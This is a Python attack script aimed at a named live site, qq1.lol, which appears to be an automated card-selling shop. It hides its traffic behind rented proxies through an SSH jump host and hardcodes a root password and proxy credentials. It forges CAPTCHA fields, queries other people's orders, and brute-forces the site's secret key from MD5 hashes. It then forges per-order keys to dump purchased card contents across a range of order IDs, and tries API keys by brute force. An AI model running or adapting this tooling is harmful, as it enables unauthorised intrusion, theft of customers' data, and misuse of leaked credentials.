#!/usr/bin/env python3
"""qq1.lol recheck — correct query param (qq), SYS_KEY reverse from skey, API acts tools/orders"""
import hashlib
import json
import os
import re
import shlex
import subprocess
import time
from datetime import datetime
from pathlib import Path
from urllib.parse import quote

BASE = "https://qq1.lol"
OUT = Path("/workspace/results/qq1.lol")
OUT.mkdir(parents=True, exist_ok=True)
LOG = OUT / "recheck.log"
HITS = OUT / "recheck_hits.jsonl"

QG_KEY, QG_PWD = "C413ED6D", "344F550A6F8B"
JP_PASS, JP_HOST = "DX4LmrDaPfd9", "42.240.167.114"
JAR = "/tmp/qq1_recheck_final.jar"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"

SYSKEY_WORDS = [
    "qq1", "buyi", "buyiq", "qqkqq", "QQKZC", "830603", "faka", "rainbow", "mckuai",
    "epay", "syskey", "sys_key", "123456", "admin", "888888", "666666", "secret",
    "qq1.lol", "buyi123", "buyi888", "buyi666", "buyi2024", "buyi2025", "buyi2026",
    "布衣", "ka1.one", "ka1", "kln166", "fffzz", "hmjf", "htqq", "password", "root",
    "abcdef", "Lxsj@123", "ruoyi123", "jiankong", "cron", "apikey", "token", "key",
    "qq1admin", "qq1key", "qq1api", "buyiq123", "QQKQQ", "qqkzc", "发卡", "自动发卡",
]

API_KEYS = SYSKEY_WORDS + ["", "test", "merchant", "paykey", "authkey", "对接密钥"]
_px = None


def log(msg):
    line = f"[{datetime.now():%H:%M:%S}] {msg}"
    print(line, flush=True)
    with open(LOG, "a") as f:
        f.write(line + "\n")


def hit(kind, detail, body=""):
    rec = {"ts": datetime.now().isoformat(), "kind": kind, "detail": detail, "body": (body or "")[:8000]}
    with open(HITS, "a") as f:
        f.write(json.dumps(rec, ensure_ascii=False) + "\n")
    log(f"*** HIT [{kind}] {detail}: {(body or '')[:300]}")


def ssh(script, timeout=60):
    return subprocess.run(
        ["sshpass", "-p", JP_PASS, "ssh", "-o", "StrictHostKeyChecking=no", f"root@{JP_HOST}", script],
        capture_output=True, text=True, timeout=timeout,
    ).stdout or ""


def proxy(force=False):
    global _px
    if _px and not force:
        return _px
    d = json.loads(ssh(f"curl -s 'https://share.proxy.qg.net/get?key={QG_KEY}&num=1'", 25))
    _px = f"http://{QG_KEY}:{QG_PWD}@{d['data'][0]['server']}"
    log(f"proxy {_px.split('@')[1]}")
    return _px


def curl(url, post=None, mt=28, force_px=False):
    px = proxy(force_px)
    hdr = "-H 'Referer: https://qq1.lol/' -H 'X-Requested-With: XMLHttpRequest'"
    post_part = (
        f"-X POST -H 'Content-Type: application/x-www-form-urlencoded' -d {shlex.quote(post)}"
        if post is not None else ""
    )
    script = (
        f"curl -sk --max-time {mt} -x {shlex.quote(px)} -b {JAR} -c {JAR} -A {shlex.quote(UA)} "
        f"{hdr} {post_part} -w '\\n__HTTP:%{{http_code}}' {shlex.quote(url)}"
    )
    out = ssh(script, mt + 30)
    if "__HTTP:" not in out:
        return out.strip(), "000"
    body, code = out.rsplit("__HTTP:", 1)
    return body.strip(), code.strip()


def session():
    ssh(f"rm -f {JAR}")
    curl(f"{BASE}/")
    buy, code = curl(f"{BASE}/?mod=buy&cid=4&tid=102")
    if len(buy) < 500:
        buy, code = curl(f"{BASE}/?mod=buy&cid=4&tid=102", force_px=True)
    csrf_m = re.search(r'csrf_token\s*=\s*"([a-f0-9]+)"', buy)
    hs_m = re.search(r"var hashsalt=(.+);", buy)
    csrf = csrf_m.group(1) if csrf_m else ""
    hs = ""
    if hs_m:
        hs = subprocess.run(
            ["node", "-e", f"var hashsalt={hs_m.group(1)}; console.log(hashsalt)"],
            capture_output=True, text=True, timeout=8,
        ).stdout.strip()
    return csrf, hs, buy


def make_order(csrf, hs, inputvalue):
    pay, _ = curl(
        f"{BASE}/ajax.php?act=pay",
        post=(
            f"tid=102&num=1&inputvalue={quote(inputvalue)}&csrf_token={csrf}&hashsalt={hs}"
            "&geetest_challenge=1&geetest_validate=1&geetest_seccode=1|jordan"
        ),
    )
    m = re.search(r'"trade_no"\s*:\s*"(\d+)"', pay or "")
    return m.group(1) if m else None, pay


def test_query_correct(csrf, hs):
    log("=== [1] query with CORRECT param qq= (source-confirmed) ===")
    marker = f"recheck{int(time.time()) % 1000000}"
    tn, pay = make_order(csrf, hs, marker)
    log(f"order trade_no={tn} marker={marker} pay={str(pay)[:120]}")
    if not tn:
        return None, None

    # wait briefly then query by input
    time.sleep(1)
    for post in [
        f"qq={marker}",
        f"qq={marker}&type=0&page=1",
        f"qq={marker}&type=1&page=1",
        f"qq={tn}&type=1&page=1",
    ]:
        body, code = curl(f"{BASE}/ajax.php?act=query", post=post)
        log(f"  query post={post[:40]} HTTP={code} body={str(body)[:200]}")
        if body and '"code":0' in body and "data" in body:
            hit("query_ok", post, body)
            try:
                data = json.loads(body)
                if data.get("data"):
                    return data["data"][0], marker
            except Exception:
                pass
        time.sleep(1)

    # also try previous known inputs
    for old in ("recheck_tg", "usdtprobe", "deep6probe", "alipayprobe", "d5test", "testuser", "recheck1"):
        body, code = curl(f"{BASE}/ajax.php?act=query", post=f"qq={old}&page=1")
        log(f"  old qq={old} HTTP={code} body={str(body)[:160]}")
        if body and '"code":0' in body and '"data"' in body:
            hit("query_old", old, body)
            try:
                data = json.loads(body)
                if data.get("data"):
                    return data["data"][0], old
            except Exception:
                pass
        time.sleep(0.8)
    return None, marker


def reverse_syskey(order_row):
    log("=== [2] reverse SYS_KEY from returned skey ===")
    oid = order_row.get("id")
    skey = order_row.get("skey")
    log(f"  oid={oid} skey={skey}")
    if not oid or not skey:
        return None
    # also try trade_no based variants
    for w in SYSKEY_WORDS + [str(oid), ""]:
        for fmt in [
            lambda x: hashlib.md5(f"{oid}{x}{oid}".encode()).hexdigest(),
            lambda x: hashlib.md5(f"{oid}{x}".encode()).hexdigest(),
            lambda x: hashlib.md5(f"{x}{oid}".encode()).hexdigest(),
            lambda x: hashlib.md5(x.encode()).hexdigest() if x else None,
        ]:
            try:
                sk = fmt(w)
            except Exception:
                continue
            if sk and sk == skey:
                hit("syskey", f"word={w!r} oid={oid}", skey)
                return w
    log("  SYS_KEY not in small dict — need larger dict or leak")
    return None


def dump_orders_with_syskey(syskey):
    log(f"=== [3] dump recent orders with SYS_KEY={syskey!r} ===")
    for oid in range(25940, 25955):
        sk = hashlib.md5(f"{oid}{syskey}{oid}".encode()).hexdigest()
        body, _ = curl(f"{BASE}/ajax.php?act=order", post=f"id={oid}&skey={sk}")
        if body and "kminfo" in body:
            hit("kminfo", f"oid={oid}", body)
        elif body and '"code":0' in body:
            hit("order_ok", f"oid={oid}", body)
        time.sleep(0.5)


def test_api_correct_acts():
    log("=== [4] API acts tools/orders/change/clone/classlist ===")
    for act in ("tools", "orders", "change", "clone", "classlist", "search", "goodslistbycid"):
        for key in API_KEYS[:20]:
            url = f"{BASE}/%61pi.php?act={act}&key={quote(key)}&limit=5&id=25950&tid=102&zt=1"
            body, code = curl(url)
            if not body or "_guard" in body:
                continue
            if "请提供" in body or "密钥错误" in body or "No Act" in body:
                continue
            if '"code":0' in body or "tid" in body or "kminfo" in body or (body.startswith("[") or body.startswith("{")):
                if "请提供" not in body:
                    hit("api_act", f"act={act} key={key!r}", body)
                    if act in ("orders", "tools", "search") and key:
                        return key
        time.sleep(0.3)


def test_operator_query():
    log("=== [5] query operator telegram as input ===")
    contacts = [
        "buyi", "buyiq", "@buyi", "@buyiq", "qqkqq", "@qqkqq", "QQKZC", "@QQKZC",
        "kawei1", "@kawei1", "830603", "布衣",
    ]
    for c in contacts:
        body, code = curl(f"{BASE}/ajax.php?act=query", post=f"qq={quote(c)}&page=1")
        log(f"  qq={c} HTTP={code} body={str(body)[:160]}")
        if body and '"code":0' in body and "data" in body:
            try:
                data = json.loads(body)
                if data.get("data"):
                    hit("operator_orders", c, body)
                    return data["data"][0]
            except Exception:
                pass
        time.sleep(0.8)
    return None


def main():
    log("=== RECHECK START ===")
    csrf, hs, buy = session()
    log(f"csrf={csrf[:12]} hs={hs[:12]} buy_len={len(buy)}")

    row, marker = test_query_correct(csrf, hs)
    if row:
        log(f"got order row: {json.dumps(row, ensure_ascii=False)[:300]}")
        sk = reverse_syskey(row)
        if sk is not None:
            dump_orders_with_syskey(sk)
            # also forge order for any recent id
            with open(OUT / "SYS_KEY.txt", "w") as f:
                f.write(sk)

    op = test_operator_query()
    if op and not row:
        reverse_syskey(op)

    test_api_correct_acts()

    n = sum(1 for _ in open(HITS)) if HITS.exists() else 0
    log(f"=== RECHECK DONE hits={n} ===")


if __name__ == "__main__":
    main()
